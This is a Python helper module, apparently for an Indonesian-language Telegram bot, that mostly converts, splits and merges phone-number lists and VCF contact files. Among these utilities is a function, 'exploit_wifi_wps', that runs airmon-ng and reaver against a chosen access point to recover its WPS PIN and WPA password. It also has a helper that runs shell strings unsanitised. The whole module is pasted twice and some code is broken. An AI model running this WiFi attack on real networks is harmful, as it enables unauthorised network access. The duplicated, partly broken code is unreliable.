import pandas as pd
import os
import re
import logging
import subprocess
from datetime import datetime
import csv
from bot import *
from openpyxl.drawing.image import Image as OpenPyXLImage
from telebot.types import Message
from io import BytesIO
import subprocess
import io
from PIL import Image as PILImage
from openpyxl import load_workbook
from openpyxl.drawing.image import Image as OpenPyxlImage
import xlwings as xw

def rename_vcf_files_and_contacts(vcf_files, new_file_prefix, new_contact_name, start_number):
    try:
        for index, old_file in enumerate(vcf_files):
            # Determine new file name based on the number of files
            if len(vcf_files) == 1:
                new_file_name = f"{new_file_prefix}.vcf"  # Single file
            else:
                new_file_name = f"{new_file_prefix} {start_number + index}.vcf"  # Multiple files with numbering

            # Check if the new file name already exists
            if os.path.exists(new_file_name):
                print(f"File already exists: {new_file_name}. Skipping renaming.")
                continue

            # Read the content of the old file and write to the new file
            with open(old_file, 'r') as file:
                lines = file.readlines()

            contact_number = 1  # Initialize contact number for the current file

            with open(new_file_name, 'w') as new_file:
                for line in lines:
                    # Update contact name format
                    if line.startswith("FN:"):
                        line = f"FN:{new_contact_name} {contact_number}\n"
                        contact_number += 1
                    new_file.write(line)

            # Remove the old file after renaming (optional)
            os.remove(old_file)
            print(f"Renamed and updated contacts in: {old_file} -> {new_file_name}")

        print("Proses selesai.")
        
    except Exception as e:
        print(f"Terjadi error: {e}")

def save_vcf(content: str, filename: str) -> str:
    """Simpan konten VCF ke file dan kembalikan jalur filenya."""
    # Tentukan direktori untuk menyimpan file
    directory = 'files'
    
    # Buat direktori jika belum ada
    if not os.path.exists(directory):
        os.makedirs(directory)

    # Tentukan jalur file lengkap
    file_path = os.path.join(directory, filename)

    # Simpan konten ke file
    with open(file_path, 'w') as file:
        file.write(content)

    return file_path

def convert2(data):
    try:
        logging.info("Memulai proses konversi...")

        # Extract data from input
        filename = data['filename']
        totalc = data['totalc']  # Jumlah kontak per file
        totalf = data['totalf']  # Total file yang ingin dibuat
        file_change_frequency = data['file_change_frequency']
        file_names = data['file_names']
        contact_names = data['contact_names']
        output_dir = data.get('output_dir', '')

        # Check and create output directory if it doesn't exist
        if output_dir and not os.path.exists(output_dir):
            os.makedirs(output_dir)
            logging.info(f"Membuat direktori output: {output_dir}")

        # Check if input file exists
        if not os.path.exists(filename):
            raise FileNotFoundError(f"File {filename} tidak ditemukan.")

        # Read contacts from the input file
        with open(filename, 'r') as f:
            contacts = [line.strip() for line in f.readlines()]

        logging.info(f"Jumlah kontak yang dibaca: {len(contacts)}")

        # Calculate how many files are needed
        total_files_needed = (len(contacts) + totalc - 1) // totalc
        totalf = min(totalf, total_files_needed)

        vcf_files = []
        current_contact_index = 0
        file_counter = 1

        # Process each requested file
        for i in range(totalf):
            file_index = i // file_change_frequency
            if file_index >= len(file_names):
                file_index = len(file_names) - 1

            file_number = (i % file_change_frequency) + 1
            vcf_filename = os.path.join(output_dir, f"{file_names[file_index]} {file_number}.vcf")
            logging.info(f"Path file VCF yang akan dibuat: {vcf_filename}")

            contact_name_index = file_index % len(contact_names)
            contact_name = contact_names[contact_name_index]

            try:
                with open(vcf_filename, 'w') as vcf_file:
                    contact_number = 1  
                    for j in range(totalc):
                        if current_contact_index >= len(contacts):
                            break
                        contact = contacts[current_contact_index]
                        vcf_content = (f"BEGIN:VCARD\nVERSION:3.0\n"
                                       f"FN:{contact_name} {contact_number}\n"
                                       f"TEL:{contact}\nEND:VCARD\n")
                        vcf_file.write(vcf_content)

                        logging.info(f"Menyimpan kontak ke {vcf_filename}: {vcf_content.strip()}")
                        current_contact_index += 1
                        contact_number += 1

                # Check if the file was successfully created
                if os.path.exists(vcf_filename):
                    vcf_files.append(vcf_filename)
                    logging.info(f"File berhasil dibuat: {vcf_filename}")
                else:
                    logging.error(f"File tidak ditemukan setelah pembuatan: {vcf_filename}")

            except IOError as io_err:
                logging.error(f"Gagal membuat file {vcf_filename}: {io_err}")

        # Process remaining contacts if any
        if current_contact_index < len(contacts):
            logging.info(f"Masih ada sisa kontak, melanjutkan konversi ke file baru...")

            while current_contact_index < len(contacts):
                file_number = (file_counter % file_change_frequency) + 1
                vcf_filename = os.path.join(output_dir, f"{file_names[-1]} {file_counter}.vcf")
                logging.info(f"Membuat file VCF untuk sisa kontak: {vcf_filename}")

                try:
                    with open(vcf_filename, 'w') as vcf_file:
                        contact_name = contact_names[-1]
                        contact_number = 1  

                        for j in range(totalc):
                            if current_contact_index >= len(contacts):
                                break
                            contact = contacts[current_contact_index]
                            vcf_content = (f"BEGIN:VCARD\nVERSION:3.0\n"
                                           f"FN:{contact_name} {contact_number}\n"
                                           f"TEL:{contact}\nEND:VCARD\n")
                            vcf_file.write(vcf_content)

                            logging.info(f"Menyimpan kontak ke {vcf_filename}: {vcf_content.strip()}")
                            current_contact_index += 1
                            contact_number += 1

                    # Check if the file was successfully created
                    if os.path.exists(vcf_filename):
                        vcf_files.append(vcf_filename)
                        logging.info(f"File berhasil dibuat: {vcf_filename}")
                    else:
                        logging.error(f"File tidak ditemukan setelah pembuatan: {vcf_filename}")

                    file_counter += 1  

                except IOError as io_err:
                    logging.error(f"Gagal membuat file {vcf_filename}: {io_err}")

        logging.info("Proses konversi selesai.")
        logging.info(f"File VCF yang dihasilkan: {vcf_files}")

        return vcf_files

    except Exception as e:
        logging.error("Error selama proses konversi: ", exc_info=True)
        raise e

        
def extract_images_from_excel(file_path):

    ext = os.path.splitext(file_path)[1].lower()

    images = []



    if ext == '.xlsx':

        # Handle .xlsx files

        workbook = load_workbook(file_path, data_only=True)

        sheet = workbook.active



        for drawing in sheet._images:

            if isinstance(drawing, OpenPyxlImage):

                images.append(drawing)



        for idx, img in enumerate(images):

            image_data = io.BytesIO(img._data())

            img_pil = PILImage.open(image_data)

            img_path = f"extracted_image_{idx}.png"

            img_pil.save(img_path)

            images[idx] = img_path  # Store the path for returning

            print(f"Gambar {idx} berhasil disimpan sebagai '{img_path}'.")



    elif ext == '.xls':

        # Handle .xls files using xlwings

        app = xw.App(visible=False)

        wb = app.books.open(file_path)

        sheet = wb.sheets[0]



        for shape in sheet.shapes:

            if shape.type == 'Picture':

                img_path = f"extracted_image_{shape.name}.png"

                shape.api.CopyPicture()  # Copy the picture

                img = PILImage.new("RGB", (shape.width, shape.height))

                img.paste(PILImage.open(io.BytesIO(xw.books.active.api.Selection.CopyPicture())))

                img.save(img_path)

                images.append(img_path)

                print(f"Gambar '{shape.name}' berhasil disimpan sebagai '{img_path}'.")



        wb.close()

        app.quit()



    return images  # Return a list of extracted image file paths



def count_vcf_contacts(filename):

    try:

        with open(filename, 'r', encoding='utf-8') as file:

            contacts = 0

            for line in file:

                # Each contact starts with "BEGIN:VCARD"

                if line.startswith("BEGIN:VCARD"):

                    contacts += 1

            return contacts

    except FileNotFoundError:

        print(f"File not found: {filename}")

        return 0

    except Exception as e:

        print(f"An error occurred: {e}")

        return 0



def generate_vcf_files(data):

    try:

        file_names = data['file_names_list']

        contact_names = data['contact_names_list']

        contacts_per_file = data['contacts_per_file']

        total_files = data['total_files']

        file_path = data['file_path']

        

        contacts = []

        with open(file_path, 'r') as file:

            contacts = file.readlines()

        

        current_contact = 0

        for i in range(total_files):

            file_name = file_names[i % len(file_names)]

            contact_name = contact_names[i % len(contact_names)]

            

            vcf_content = ""

            for j in range(contacts_per_file):

                if current_contact >= len(contacts):

                    break

                vcf_content += f"BEGIN:VCARD\nVERSION:3.0\nFN:{contact_name} {j+1}\nTEL:{contacts[current_contact].strip()}\nEND:VCARD\n"

                current_contact += 1

            

            vcf_file = f"files/{file_name}_{i+1}.vcf"

            with open(vcf_file, 'w') as file:

                file.write(vcf_content)

                

            # Here you could add logic to send each file to the user

    except Exception as e:

        print(f"Error in generate_vcf_files: {e}")



def rearrange_to_one_column(input_file, output_file):

    try:

        # Baca isi file dan simpan setiap baris sebagai list yang mewakili kolom

        with open(input_file, 'r') as file:

            lines = [line.strip().split() for line in file.readlines()]

        

        # Pastikan file tidak kosong

        if not lines:

            print("File kosong.")

            return



        # Tentukan jumlah baris dan kolom

        rows = len(lines)

        columns = max(len(line) for line in lines)  # Pastikan jumlah kolom sesuai dengan kolom terbanyak



        # Buat list untuk menyimpan hasil pengurutan kolom ke satu kolom

        rearranged = []



        # Urutkan data secara siklis dari atas ke kiri lalu kebawah

        for col in range(columns):

            for row in range(rows):

                if col < len(lines[row]):

                    rearranged.append(lines[row][col])



        # Tulis hasil pengurutan ke file output, setiap item pada baris baru

        with open(output_file, 'w') as file:

            for item in rearranged:

                file.write(item + '\n')

        

        print(f"File berhasil diproses dan disimpan ke {output_file}")

    

    except Exception as e:

        print(f"Terjadi kesalahan: {e}")



# Contoh penggunaan saat script dijalankan langsung

if __name__ == "__main__":

    input_filename = 'input.txt'

    output_filename = 'output.txt'

    rearrange_to_one_column(input_filename, output_filename)



def check_user(wl, user_id):

  if user_id == owner:

    return True



  if str(user_id) not in wl.keys():

    return False

  else:

    now = datetime.now(wib)

    exp_time = datetime.strptime(wl[str(user_id)], datetime_format).replace(tzinfo=wib)



    if now > exp_time:

      return False

    else:

      return True



def convert(data):

    numbers = check_number(data['filename'])

    split_number = split(numbers, data['totalc'])



    countc = 0

    countf = 0

    vcf_files = []

    sisa = []

    

    for numbers in split_number:

        vcard_entries = []

        for number in numbers:

            countc += 1

            vcard_entry = f"BEGIN:VCARD\nVERSION:3.0\nFN:{data['cname']}-{countc}\nTEL;TYPE=CELL:+{number}\nEND:VCARD"

            vcard_entries.append(vcard_entry)



        countf += 1

        if countf > data['totalf']:

            sisa.extend(numbers)  # Use extend instead of append to flatten the list

        else:

            vcf_name = f"files/{data['name']}_{countf}.vcf"

            vcf_files.append(vcf_name)

            

            with open(vcf_name, 'w', encoding='utf-8') as vcard_file:

                vcard_file.write("\n".join(vcard_entries) + "\n")

    

    if sisa:

        file_txt = "files/sisa.txt"

        vcf_files.append(file_txt)

        

        with open(file_txt, 'w', encoding='utf-8') as file:

            file.write("\n".join(sisa) + "\n")

    

    return vcf_files



def convert_vcf(data):

    data['filename'] = convert_xlsx_to_txt(data)

    numbers = check_number(data['filename'])

    split_number = split(numbers, data['totalc'])



    countc = 0

    countf = 0

    vcf_files = []

    

    for numbers in split_number:

        vcard_entries = []

        for number in numbers:

            countc += 1

            vcard_entry = f"BEGIN:VCARD\nVERSION:3.0\nFN:{data['cname']}-{countc}\nTEL;TYPE=CELL:+{number}\nEND:VCARD"

            vcard_entries.append(vcard_entry)



        countf += 1

        vcf_name = f"files/{data['name']}_{countf}.vcf"

        vcf_files.append(vcf_name)

        

        with open(vcf_name, 'w', encoding='utf-8') as vcard_file:

            vcard_file.write("\n".join(vcard_entries) + "\n")

        

        if countf == data['totalf']:

            break



    return vcf_files



def convert_xlsx_to_txt(data):

    df = pd.read_excel(data['filename'])

    file_name = f"files/{data['name']}.txt"

    df.to_csv(file_name, index=False, sep='\t')



    return file_name



def check_number(filename):

    """Baca file dan ambil nomor telepon dari setiap baris."""

    numbers = []

    with open(filename, 'r', encoding='utf-8') as file:

        for line in file:

            line = line.strip()

            if line.isdigit():

                numbers.append(line)

    return numbers

        

def pecah_txt(data):

  numbers = check_number(data['filename'])

  split_number = split(numbers, data['totaln'])

  countf = 0

  files = []



  for numbers in split_number:

    countf+=1

    txt_name = f"files/{data['name']}_{countf}.txt"

    files.append(txt_name)



    with open(txt_name, 'w', encoding='utf-8') as file:

      for number in numbers:

        file.write(number + "\n")



    if countf == data['totalf']:

      break

  

  return files



def pecah_vcf(data):

    with open(data['filename'], 'r', encoding='utf-8') as file:

        lines = file.readlines()



    contacts = []

    current_contact = []



    for line in lines:

        if not line.strip():

            continue



        current_contact.append(line)

        if line.strip() == 'END:VCARD':

            contacts.append(current_contact)

            current_contact = []



    split_contact = split(contacts, data['totalc'])

    countf = 0

    files = []



    for contacts in split_contact:

        countf += 1

        file_name = f"files/{data['name']}_{countf}.vcf"

        files.append(file_name)

        

        with open(file_name, 'w', encoding='utf-8') as file:

            file.write("".join("".join(contact) for contact in contacts))



        if countf == data['totalf']:

            break



    return files



def convert_vcf_to_txt(data):

    vcf_file = data.get('filename')

    txt_file = f"files/{data.get('name')}.txt"



    if not vcf_file or not os.path.isfile(vcf_file):

        raise FileNotFoundError(f"File VCF tidak ditemukan: {vcf_file}")



    try:

        with open(vcf_file, 'r', encoding='utf-8') as vcf_file_content:

            vcf_data = vcf_file_content.read()



        # Memproses data VCF untuk mengekstrak nama dan nomor telepon

        lines = vcf_data.split('END:VCARD')

        with open(txt_file, 'w', encoding='utf-8') as txt_file_content:

            for line in lines:

                # Ekstrak nama

                name_match = re.search(r'FN:(.+)', line)

                # Ekstrak nomor telepon

                tel_match = re.search(r'TEL;TYPE=CELL:(\+?\d+)', line)



                if tel_match:

                    tel = tel_match.group(1).strip()

                    tel = re.sub(r'\D', '', tel)  # Menghapus semua karakter non-digit



                    # Menulis nama dan nomor telepon ke dalam file teks

                    txt_file_content.write(f"{tel}\n")



        return txt_file

    except Exception as e:

        logging.error("Error converting VCF to TXT: ", exc_info=True)

        raise 


def gabung_vcf(input_files, output_file):

    logging.info("Memulai penggabungan VCF.")

    with open(output_file, 'wb') as outfile:

        for i, filename in enumerate(input_files):

            logging.info(f"Membaca file: {filename}")

            with open(filename, 'rb') as infile:

                content = infile.read()

                outfile.write(content)

                

            if i < len(input_files) - 1:

                outfile.write(b'\n')



    logging.info(f"Penggabungan selesai. File output: {output_file}")

    



# Fungsi untuk menyimpan teks ke file TXT

def save_txt(text, filename):

    file_path = os.path.join('files', filename)

    with open(file_path, 'w') as file:

        file.write(text)

    return file_path



# Fungsi untuk menjalankan perintah shell dan mengembalikan output

def run_command(command):

    try:

        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)

        return output.decode('utf-8')

    except subprocess.CalledProcessError as e:

        logging.error(f"Command failed: {e}")

        return None



# Fungsi untuk mengeksploitasi WiFi WPS/WPA menggunakan alat `reaver`

def exploit_wifi_wps(interface, bssid, channel):

    try:

        # Set interface ke mode monitor

        run_command(f"airmon-ng start {interface} {channel}")

        

        # Jalankan reaver untuk eksploitasi WPS

        reaver_command = f"reaver -i {interface} -b {bssid} -c {channel} -vv"

        reaver_output = run_command(reaver_command)

        

        # Ekstrak informasi dari output reaver

        ssid = extract_ssid(reaver_output)

        pin = extract_pin(reaver_output)

        password = extract_password(reaver_output)

        security = "WPA/WPA2"  # Logika bisa ditambahkan untuk mendeteksi jenis keamanan lain



        # Asumsikan kelemahan berdasarkan apakah WPS aktif

        weakness = "WPS Enabled" if "WPS" in reaver_output else "No WPS"



        return {

            'ssid': ssid or "Unknown",

            'pin': pin or "Not Found",

            'password': password or "Not Found",

            'security': security,

            'weakness': weakness

        }

    except Exception as e:

        logging.error(f"Error in exploit_wifi_wps: {e}")

        return {

            'ssid': "Unknown",

            'pin': "Not Found",

            'password': "Not Found",

            'security': "Unknown",

            'weakness': "Unknown"

        }



# Fungsi untuk mengekstrak SSID dari output reaver

def extract_ssid(output):

    ssid_match = re.search(r"SSID\s+:\s+(.+)", output)

    if ssid_match:

        return ssid_match.group(1).strip()

    return None



# Fungsi untuk mengekstrak PIN dari output reaver

def extract_pin(output):

    pin_match = re.search(r"WPS PIN:\s+(\d{8})", output)

    if pin_match:

        return pin_match.group(1)

    return None



# Fungsi untuk mengekstrak password dari output reaver

def extract_password(output):

    password_match = re.search(r"PSK\s+:\s+(.+)", output)

    if password_match:

        return password_match.group(1).strip()

    return None



def gabung_txt(input_files, output_file):

    logging.info("Memulai penggabungan TXT.")

    with open(output_file, 'w', encoding='utf-8') as outfile:

        for i, filename in enumerate(input_files):

            logging.info(f"Membaca file: {filename}")

            with open(filename, 'r', encoding='utf-8') as infile:

                content = infile.read()

                outfile.write(content)

                

            if i < len(input_files) - 1:

                outfile.write('\n')  # Tambahkan baris baru antara file jika bukan file terakhir



    logging.info(f"Penggabungan selesai. File output: {output_file}")



def remove_plus_and_spaces(input_file, output_file):

    logging.info(f"Memproses file: {input_file}")

    with open(input_file, 'r') as infile, open(output_file, 'w') as outfile:

        for line in infile:

            # Hapus semua tanda '+' dan spasi

            cleaned_line = line.replace('+', '').replace(' ', '')

            outfile.write(cleaned_line)

    logging.info(f"File selesai diproses: {output_file}")



def gabungkan_kolom(input_file, output_file):

    """

    Fungsi untuk menggabungkan kolom-kolom dari atas ke kiri lalu kebawah,

    lalu ke kolom selanjutnya dan seterusnya sampai isi file habis.

    """

    try:

        with open(input_file, 'r', newline='', encoding='utf-8') as f_input:

            reader = csv.reader(f_input, delimiter='\t')  # Anggap file menggunakan delimiter tab

            data = list(reader)

        

        # Menyiapkan list untuk menampung hasil penggabungan

        combined_col = []

        

        # Dapatkan jumlah baris dan kolom

        max_rows = len(data)

        max_cols = len(data[0]) if max_rows > 0 else 0



        # Proses penggabungan dari atas ke kiri, lalu kebawah dan ke kolom berikutnya

        for row_index in range(max_rows):

            for col_index in range(max_cols):

                for r in range(row_index, max_rows):

                    if col_index < len(data[r]):  # Pastikan kolom ada di baris ini

                        combined_col.append(data[r][col_index])



        # Tulis hasilnya ke file output

        with open(output_file, 'w', newline='', encoding='utf-8') as f_output:

            writer = csv.writer(f_output, delimiter='\t')

            for item in combined_col:

                writer.writerow([item])  # Setiap elemen ditulis di baris baru



    except Exception as e:

        print(f"Error saat menggabungkan kolom: {e}")





def split(arr, num):

    return [arr[x:x+num] for x in range(0, len(arr), num)]



if __name__ == "__main__":

    data = {

        'filename': 'files/11-112.txt',

        'name': 'tes',

        'cname': 'tes',

        'totalc': 100,

        'totalf': 5,

    }

    convert(data)



def extract_images_from_excel(file_path):
    ext = os.path.splitext(file_path)[1].lower()
    images = []

    if ext == '.xlsx':
        # Handle .xlsx files
        workbook = load_workbook(file_path, data_only=True)
        sheet = workbook.active

        for drawing in sheet._images:
            if isinstance(drawing, OpenPyxlImage):
                images.append(drawing)

        for idx, img in enumerate(images):
            image_data = io.BytesIO(img._data())
            img_pil = PILImage.open(image_data)
            img_path = f"extracted_image_{idx}.png"
            img_pil.save(img_path)
            images[idx] = img_path  # Store the path for returning
            print(f"Gambar {idx} berhasil disimpan sebagai '{img_path}'.")

    elif ext == '.xls':
        # Handle .xls files using xlwings
        app = xw.App(visible=False)
        wb = app.books.open(file_path)
        sheet = wb.sheets[0]

        for shape in sheet.shapes:
            if shape.type == 'Picture':
                img_path = f"extracted_image_{shape.name}.png"
                shape.api.CopyPicture()  # Copy the picture
                img = PILImage.new("RGB", (shape.width, shape.height))
                img.paste(PILImage.open(io.BytesIO(xw.books.active.api.Selection.CopyPicture())))
                img.save(img_path)
                images.append(img_path)
                print(f"Gambar '{shape.name}' berhasil disimpan sebagai '{img_path}'.")

        wb.close()
        app.quit()

    return images  # Return a list of extracted image file paths

def count_vcf_contacts(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            contacts = 0
            for line in file:
                # Each contact starts with "BEGIN:VCARD"
                if line.startswith("BEGIN:VCARD"):
                    contacts += 1
            return contacts
    except FileNotFoundError:
        print(f"File not found: {filename}")
        return 0
    except Exception as e:
        print(f"An error occurred: {e}")
        return 0

def generate_vcf_files(data):
    try:
        file_names = data['file_names_list']
        contact_names = data['contact_names_list']
        contacts_per_file = data['contacts_per_file']
        total_files = data['total_files']
        file_path = data['file_path']
        
        contacts = []
        with open(file_path, 'r') as file:
            contacts = file.readlines()
        
        current_contact = 0
        for i in range(total_files):
            file_name = file_names[i % len(file_names)]
            contact_name = contact_names[i % len(contact_names)]
            
            vcf_content = ""
            for j in range(contacts_per_file):
                if current_contact >= len(contacts):
                    break
                vcf_content += f"BEGIN:VCARD\nVERSION:3.0\nFN:{contact_name} {j+1}\nTEL:{contacts[current_contact].strip()}\nEND:VCARD\n"
                current_contact += 1
            
            vcf_file = f"files/{file_name}_{i+1}.vcf"
            with open(vcf_file, 'w') as file:
                file.write(vcf_content)
                
            # Here you could add logic to send each file to the user
    except Exception as e:
        print(f"Error in generate_vcf_files: {e}")

def rearrange_to_one_column(input_file, output_file):
    try:
        # Baca isi file dan simpan setiap baris sebagai list yang mewakili kolom
        with open(input_file, 'r') as file:
            lines = [line.strip().split() for line in file.readlines()]
        
        # Pastikan file tidak kosong
        if not lines:
            print("File kosong.")
            return

        # Tentukan jumlah baris dan kolom
        rows = len(lines)
        columns = max(len(line) for line in lines)  # Pastikan jumlah kolom sesuai dengan kolom terbanyak

        # Buat list untuk menyimpan hasil pengurutan kolom ke satu kolom
        rearranged = []

        # Urutkan data secara siklis dari atas ke kiri lalu kebawah
        for col in range(columns):
            for row in range(rows):
                if col < len(lines[row]):
                    rearranged.append(lines[row][col])

        # Tulis hasil pengurutan ke file output, setiap item pada baris baru
        with open(output_file, 'w') as file:
            for item in rearranged:
                file.write(item + '\n')
        
        print(f"File berhasil diproses dan disimpan ke {output_file}")
    
    except Exception as e:
        print(f"Terjadi kesalahan: {e}")

# Contoh penggunaan saat script dijalankan langsung
if __name__ == "__main__":
    input_filename = 'input.txt'
    output_filename = 'output.txt'
    rearrange_to_one_column(input_filename, output_filename)

def check_user(wl, user_id):
  if user_id == owner:
    return True

  if str(user_id) not in wl.keys():
    return False
  else:
    now = datetime.now(wib)
    exp_time = datetime.strptime(wl[str(user_id)], datetime_format).replace(tzinfo=wib)

    if now > exp_time:
      return False
    else:
      return True

def convert(data):
    numbers = check_number(data['filename'])
    split_number = split(numbers, data['totalc'])

    countc = 0
    countf = 0
    vcf_files = []
    sisa = []
    
    for numbers in split_number:
        vcard_entries = []
        for number in numbers:
            countc += 1
            vcard_entry = f"BEGIN:VCARD\nVERSION:3.0\nFN:{data['cname']}-{countc}\nTEL;TYPE=CELL:+{number}\nEND:VCARD"
            vcard_entries.append(vcard_entry)

        countf += 1
        if countf > data['totalf']:
            sisa.extend(numbers)  # Use extend instead of append to flatten the list
        else:
            vcf_name = f"files/{data['name']}_{countf}.vcf"
            vcf_files.append(vcf_name)
            
            with open(vcf_name, 'w', encoding='utf-8') as vcard_file:
                vcard_file.write("\n".join(vcard_entries) + "\n")
    
    if sisa:
        file_txt = "files/sisa.txt"
        vcf_files.append(file_txt)
        
        with open(file_txt, 'w', encoding='utf-8') as file:
            file.write("\n".join(sisa) + "\n")
    
    return vcf_files

def convert_vcf(data):
    data['filename'] = convert_xlsx_to_txt(data)
    numbers = check_number(data['filename'])
    split_number = split(numbers, data['totalc'])

    countc = 0
    countf = 0
    vcf_files = []
    
    for numbers in split_number:
        vcard_entries = []
        for number in numbers:
            countc += 1
            vcard_entry = f"BEGIN:VCARD\nVERSION:3.0\nFN:{data['cname']}-{countc}\nTEL;TYPE=CELL:+{number}\nEND:VCARD"
            vcard_entries.append(vcard_entry)

        countf += 1
        vcf_name = f"files/{data['name']}_{countf}.vcf"
        vcf_files.append(vcf_name)
        
        with open(vcf_name, 'w', encoding='utf-8') as vcard_file:
            vcard_file.write("\n".join(vcard_entries) + "\n")
        
        if countf == data['totalf']:
            break

    return vcf_files

def convert_xlsx_to_txt(data):
    df = pd.read_excel(data['filename'])
    file_name = f"files/{data['name']}.txt"
    df.to_csv(file_name, index=False, sep='\t')

    return file_name

def check_number(filename):
    """Baca file dan ambil nomor telepon dari setiap baris."""
    numbers = []
    with open(filename, 'r', encoding='utf-8') as file:
        for line in file:
            line = line.strip()
            if line.isdigit():
                numbers.append(line)
    return numbers
        
def pecah_txt(data):
  numbers = check_number(data['filename'])
  split_number = split(numbers, data['totaln'])
  countf = 0
  files = []

  for numbers in split_number:
    countf+=1
    txt_name = f"files/{data['name']}_{countf}.txt"
    files.append(txt_name)

    with open(txt_name, 'w', encoding='utf-8') as file:
      for number in numbers:
        file.write(number + "\n")

    if countf == data['totalf']:
      break
  
  return files

def pecah_vcf(data):
    with open(data['filename'], 'r', encoding='utf-8') as file:
        lines = file.readlines()

    contacts = []
    current_contact = []

    for line in lines:
        if not line.strip():
            continue

        current_contact.append(line)
        if line.strip() == 'END:VCARD':
            contacts.append(current_contact)
            current_contact = []

    split_contact = split(contacts, data['totalc'])
    countf = 0
    files = []

    for contacts in split_contact:
        countf += 1
        file_name = f"files/{data['name']}_{countf}.vcf"
        files.append(file_name)
        
        with open(file_name, 'w', encoding='utf-8') as file:
            file.write("".join("".join(contact) for contact in contacts))

        if countf == data['totalf']:
            break

    return files

def convert_vcf_to_txt(data):
    vcf_file = data.get('filename')
    txt_file = f"files/{data.get('name')}.txt"

    if not vcf_file or not os.path.isfile(vcf_file):
        raise FileNotFoundError(f"File VCF tidak ditemukan: {vcf_file}")

    try:
        with open(vcf_file, 'r', encoding='utf-8') as vcf_file_content:
            vcf_data = vcf_file_content.read()

        # Memproses data VCF untuk mengekstrak nama dan nomor telepon
        lines = vcf_data.split('END:VCARD')
        with open(txt_file, 'w', encoding='utf-8') as txt_file_content:
            for line in lines:
                # Ekstrak nama
                name_match = re.search(r'FN:(.+)', line)
                # Ekstrak nomor telepon
                tel_match = re.search(r'TEL;TYPE=CELL:(\+?\d+)', line)

                if tel_match:
                    tel = tel_match.group(1).strip()
                    tel = re.sub(r'\D', '', tel)  # Menghapus semua karakter non-digit

                    # Menulis nama dan nomor telepon ke dalam file teks
                    txt_file_content.write(f"{tel}\n")

        return txt_file
    except Exception as e:
        logging.error("Error converting VCF to TXT: ", exc_info=True)
        raise


def gabung_vcf(input_files, output_file):
    logging.info("Memulai penggabungan VCF.")
    with open(output_file, 'wb') as outfile:
        for i, filename in enumerate(input_files):
            logging.info(f"Membaca file: {filename}")
            with open(filename, 'rb') as infile:
                content = infile.read()
                outfile.write(content)
                
            if i < len(input_files) - 1:
                outfile.write(b'\n')

    logging.info(f"Penggabungan selesai. File output: {output_file}")
    

# Fungsi untuk menyimpan teks ke file TXT
def save_txt(text, filename):
    file_path = os.path.join('files', filename)
    with open(file_path, 'w') as file:
        file.write(text)
    return file_path

# Fungsi untuk menjalankan perintah shell dan mengembalikan output
def run_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode('utf-8')
    except subprocess.CalledProcessError as e:
        logging.error(f"Command failed: {e}")
        return None

# Fungsi untuk mengeksploitasi WiFi WPS/WPA menggunakan alat `reaver`
def exploit_wifi_wps(interface, bssid, channel):
    try:
        # Set interface ke mode monitor
        run_command(f"airmon-ng start {interface} {channel}")
        
        # Jalankan reaver untuk eksploitasi WPS
        reaver_command = f"reaver -i {interface} -b {bssid} -c {channel} -vv"
        reaver_output = run_command(reaver_command)
        
        # Ekstrak informasi dari output reaver
        ssid = extract_ssid(reaver_output)
        pin = extract_pin(reaver_output)
        password = extract_password(reaver_output)
        security = "WPA/WPA2"  # Logika bisa ditambahkan untuk mendeteksi jenis keamanan lain

        # Asumsikan kelemahan berdasarkan apakah WPS aktif
        weakness = "WPS Enabled" if "WPS" in reaver_output else "No WPS"

        return {
            'ssid': ssid or "Unknown",
            'pin': pin or "Not Found",
            'password': password or "Not Found",
            'security': security,
            'weakness': weakness
        }
    except Exception as e:
        logging.error(f"Error in exploit_wifi_wps: {e}")
        return {
            'ssid': "Unknown",
            'pin': "Not Found",
            'password': "Not Found",
            'security': "Unknown",
            'weakness': "Unknown"
        }

# Fungsi untuk mengekstrak SSID dari output reaver
def extract_ssid(output):
    ssid_match = re.search(r"SSID\s+:\s+(.+)", output)
    if ssid_match:
        return ssid_match.group(1).strip()
    return None

# Fungsi untuk mengekstrak PIN dari output reaver
def extract_pin(output):
    pin_match = re.search(r"WPS PIN:\s+(\d{8})", output)
    if pin_match:
        return pin_match.group(1)
    return None

# Fungsi untuk mengekstrak password dari output reaver
def extract_password(output):
    password_match = re.search(r"PSK\s+:\s+(.+)", output)
    if password_match:
        return password_match.group(1).strip()
    return None

def gabung_txt(input_files, output_file):
    logging.info("Memulai penggabungan TXT.")
    with open(output_file, 'w', encoding='utf-8') as outfile:
        for i, filename in enumerate(input_files):
            logging.info(f"Membaca file: {filename}")
            with open(filename, 'r', encoding='utf-8') as infile:
                content = infile.read()
                outfile.write(content)
                
            if i < len(input_files) - 1:
                outfile.write('\n')  # Tambahkan baris baru antara file jika bukan file terakhir

    logging.info(f"Penggabungan selesai. File output: {output_file}")

def remove_plus_and_spaces(input_file, output_file):
    logging.info(f"Memproses file: {input_file}")
    with open(input_file, 'r') as infile, open(output_file, 'w') as outfile:
        for line in infile:
            # Hapus semua tanda '+' dan spasi
            cleaned_line = line.replace('+', '').replace(' ', '')
            outfile.write(cleaned_line)
    logging.info(f"File selesai diproses: {output_file}")

def gabungkan_kolom(input_file, output_file):
    """
    Fungsi untuk menggabungkan kolom-kolom dari atas ke kiri lalu kebawah,
    lalu ke kolom selanjutnya dan seterusnya sampai isi file habis.
    """
    try:
        with open(input_file, 'r', newline='', encoding='utf-8') as f_input:
            reader = csv.reader(f_input, delimiter='\t')  # Anggap file menggunakan delimiter tab
            data = list(reader)
        
        # Menyiapkan list untuk menampung hasil penggabungan
        combined_col = []
        
        # Dapatkan jumlah baris dan kolom
        max_rows = len(data)
        max_cols = len(data[0]) if max_rows > 0 else 0

        # Proses penggabungan dari atas ke kiri, lalu kebawah dan ke kolom berikutnya
        for row_index in range(max_rows):
            for col_index in range(max_cols):
                for r in range(row_index, max_rows):
                    if col_index < len(data[r]):  # Pastikan kolom ada di baris ini
                        combined_col.append(data[r][col_index])

        # Tulis hasilnya ke file output
        with open(output_file, 'w', newline='', encoding='utf-8') as f_output:
            writer = csv.writer(f_output, delimiter='\t')
            for item in combined_col:
                writer.writerow([item])  # Setiap elemen ditulis di baris baru

    except Exception as e:
        print(f"Error saat menggabungkan kolom: {e}")


def split(arr, num):
    return [arr[x:x+num] for x in range(0, len(arr), num)]

if __name__ == "__main__":
    data = {
        'filename': 'files/11-112.txt',
        'name': 'tes',
        'cname': 'tes',
        'totalc': 100,
        'totalf': 5,
    }
    convert(data)
